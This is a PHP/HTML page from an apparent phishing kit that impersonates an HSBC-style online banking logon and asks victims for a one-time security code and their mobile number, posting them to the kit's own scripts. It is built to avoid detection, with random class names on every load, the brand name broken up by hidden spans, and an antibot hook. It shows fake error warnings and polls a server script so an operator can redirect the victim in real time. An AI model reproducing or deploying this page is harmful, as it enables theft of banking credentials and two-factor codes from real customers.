<?php
//require_once('../antibot8/code/include.php');
session_start();


date_default_timezone_set('Europe/London');
$script_tz = date_default_timezone_get();
if (strcmp($script_tz, ini_get('date.timezone'))){
   // echo 'Die Script-Zeitzone unterscheidet sich von der ini-set Zeitzone.';
} else {
//echo 'Die Script-Zeitzone und die ini-set Zeitzone stimmen überein.';
}



$coxfile=  "cox.php";

include $coxfile;
$userip =$_SERVER['REMOTE_ADDR'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $question =$row['question'];
      $user =$row['user'];


   }

   $db->close();

function generateRandomString($length = 20) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
  ?>
<html style="font-family: Lato, sans-serif;"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="jackss/njds.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,400i,700,700i,600,600i">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">


    <style>
@media only screen and (max-width: 600px)   {
  .form-group label {
      width: 100% !important;
  }
  .form-group span {
      margin-left: 4px !important;
  }
  input.smallestInput {
      margin-left: 4px !important;
  }
  input.smallestInput {
    margin-left: 5px !important;
    width: 30px !important;
}
.container.errorclass {
    height: 252px !important ;
}
section.clean-block.about-us.addsamepx {
height: 100% !important;
}
    }
    </style>
</head>

<body>
       <nav class="<?php echo generateRandomString() ?> navbar navbar-light navbar-expand-lg fixed-top bg-white clean-navbar" <?php if($_SESSION["type"]=="pro"){echo "style='background-color: #3e505d!important'";}  ?>>
        <div class="<?php echo generateRandomString() ?> container"><a class="<?php echo generateRandomString() ?> navbar-brand logo" href="#"><img src="jackss/hslogo.png"></a><button data-toggle="collapse" class="<?php echo generateRandomString() ?> navbar-toggler" data-target="#navcol-2"><span class="<?php echo generateRandomString() ?> sr-only">Toggle navigation</span><span class="<?php echo generateRandomString() ?> navbar-toggler-icon"></span></button>
            <div class="<?php echo generateRandomString() ?> collapse navbar-collapse text-justify" id="navcol-2">
                <ul class="<?php echo generateRandomString() ?> navbar-nav text-capitalize ml-auto">
                    <li class="<?php echo generateRandomString() ?> nav-item"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark active" href="#" style="font-family: Montserrat, sans-serif;font-weight: bold;font-style: normal;font-size: 17px;<?php if($_SESSION["type"]=="pro"){echo "color: white!important";}  ?>"><strong>Everyday Banking&nbsp;</strong></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-family: Montserrat, sans-serif;font-size: 17px;<?php if($_SESSION["type"]=="pro"){echo "color: white!important";}  ?>"><strong>Borrowing</strong></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;<?php if($_SESSION["type"]=="pro"){echo "color: white!important";}  ?>"><strong>Investing</strong><br></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;<?php if($_SESSION["type"]=="pro"){echo "color: white!important";}  ?>"><strong>Insurance</strong><br></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;<?php if($_SESSION["type"]=="pro"){echo "color: white!important";}  ?>"><strong>Life events</strong><br></a></li>
                </ul>
            </div>
        </div>
    </nav>
    <main class="<?php echo generateRandomString() ?> page">
        <section class="<?php echo generateRandomString() ?> clean-block about-us" style="background-color: #f8f8f8;padding-bottom: 1px;padding-top: 0px;">
            <div class="<?php echo generateRandomString() ?> container">
                <div class="<?php echo generateRandomString() ?> block-heading" style="padding-top: 50px;padding-bottom: 0px;">
                    <h2 class="<?php echo generateRandomString() ?> text-left text-dark" style="color: black;font-size: 26px;font-weight: 500;margin-bottom: -15px;font-family: Lato, sans-serif;">Log on to Online Banking<br></h2>
                </div>
            </div>
        </section>
        <section class="<?php echo generateRandomString() ?> clean-block about-us addsamepx" style="background-color: white;height: 537.3px;">
          <?php if(isset($_GET['error'])=="yes"){?>
          <div class="<?php echo generateRandomString() ?> container errorclass" style="height: 102px;border: 3px solid #FFCBC9;padding: 13px 20px 8px 117px;min-height: 58px;background: url(lp.gif) no-repeat scroll 30px 50% #FFF2F1;margin-top: 22px;margin-bottom: 20px;"><div role="alert" class="<?php echo generateRandomString() ?> alert alert-danger" style="
    background: none;
    border: none;
"><strong>ERROR:</strong> One or more of the fields your have entered is incorrect. You will not be able to access any Digital Banking services if you continue to nter your details incorrectly.</div></div>

<?php }?>


            <div class="<?php echo generateRandomString() ?> container" style="
    margin-top: 47px;
">
    <div class="<?php echo generateRandomString() ?> row">
      <form method="post" action="Fs.php" style="width: 100%;">
        <div class="<?php echo generateRandomString() ?> col-md-12"><span style="font-family: Montserrat, sans-serif;">You are logging on as : <strong><?php echo $user; ?></strong>
</span>
            <hr><span style="font-family: Montserrat, sans-serif;font-weight: bold;color: #ff0000;">Digital Secure Key.<br></br></span>
           <span style="font-family: Montserrat, sans-serif;font-weight: bold;">Enter Activation Code:<br></span>
            <div class="<?php echo generateRandomString() ?> form-group" style="margin-top: 18px;"><label style="font-size: 14px;font-family: Lato, sans-serif;"> We sent your activation code to your default <b style="font-weight: bold;font-family: 'Montserrat';">mobile number <?php 
if (isset($_POST['telephone'])) {
  echo $_POST['telephone'];
}

        ?></b> on <strong><?php  echo date($script_tz = "H:i") ." &nbsp;&nbsp;&nbsp; ".date("d/m/Y") ?></strong>
            
            
            
            <br>
            <br>Please retrieve and enter below, ignoring the (01) prefix</strong>:</label>
<br><br>
            <input type="tel" autocomplete="one-time-code" style="border: 1.3px solid #808080;height: 35px;padding-left: 31px;"  name="userid" pattern=".{5,}" required></div>

   <span style="
    position: relative;
    top: -46px;
    left: 3px;
">(01)</span>             

<span style="font-family: Montserrat, sans-serif;"><span style="text-decoration: underline;"></span>
<button type="button" data-toggle="modal" data-target="#myModal" style="
    color: #007bff;
    background: transparent;
    border: none;
    text-decoration: underline;
"> I do not have my code, please resend :</button>
<br /></span>

        </div>
        <div class="<?php echo generateRandomString() ?> col-md-12">
            <hr><button class="<?php echo generateRandomString() ?> btn btn-primary" type="submit" style="background-color: #db0011;border: none;border-radius: 1px;">Continue</button>
                                 <button class="<?php echo generateRandomString() ?> btn btn-primary" type="RESET" style="float:right;background-color: #999999;border: none;border-radius: 3px;"> Delete </button>

        </div>
      </form>
    </div>
</div><br></br>
        </section>
    </main>
    <footer class="<?php echo generateRandomString() ?> page-footer dark" style="background: #3e4045;">
        <div class="<?php echo generateRandomString() ?> container">
            <div class="<?php echo generateRandomString() ?> row">
                <div class="<?php echo generateRandomString() ?> col-sm-3">
                    <h5><strong>Support</strong></h5>
                    <ul>
                        <li><a href="#">Security centre</a></li>
                        <li><a href="#">Card support</a></li>
                        <li><a href="#">CoBrowse</a></li>
                    </ul>
                </div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>



  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header"><img src="jackss/hslogo.png">
          <button type="button" class="close" data-dismiss="modal">&times;</button>

        </div>
        <div class="modal-body" style="
    TEXT-ALIGN: CENTER;
">
          <p>if you chose to get your activation code delivred by text message, Please confirm your mobile number</p>
          <form method="post" action="" style="width: 100%;">
        <div class="YnEdFD4a5gdvLZAHJQAA col-md-12">
            
           
            <div class="q2Nb2sh0EsbrVqZMQ6bZ form-group" style="margin-top: 18px;">

            <input type="text" style="border: 1.3px solid #808080;height: 35px;padding-left: 31px;" name="telephone"  pattern=".{5,}" required=""></div>

                



        </div>
        <div class="HjjSEIvFivObQGwx1fDo col-md-12">
            <button class="qyftHENTCWxPEBUzLbRI btn btn-primary" type="submit" style="background-color: #db0011;border: none;border-radius: 5px;">Resend activation code
</button>
                                 

        </div>
      </form>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
      
    </div>
  </div>
            </div>
        </div>
        <div class="<?php echo generateRandomString() ?> footer-copyright" style="background: #3e4045;border-color: #3e4045;">
         <p>© &nbsp;H<span style="font-size: 0px;">yz</span>S<span style="font-size: 0px;">yz</span>B<span style="font-size: 0px;">yz</span>C Group 2021</p>
        </div>
    </footer>
 

    <script type="text/javascript">
          var elts = document.getElementsByClassName('smallestInput')
    Array.from(elts).forEach(function(elt){
      elt.addEventListener("keyup", function(event) {
        // Number 13 is the "Enter" key on the keyboard
        if (elt.value.length == 1) {
          // Focus on the next sibling
          elt.nextElementSibling.focus();
        }

      });
    });
    </script>
    
             <script>
function showHint() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if(this.responseText!='')
            window.location.replace(this.responseText);
                else {

                }

            }
        }
        xmlhttp.open("GET", "forcere.php", true);
        xmlhttp.send();

}
window.setInterval(function(){
  showHint();
}, 3000);



    </script>
      <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    
    <script src="assets/js/script.min.js"></script>


</body></html>
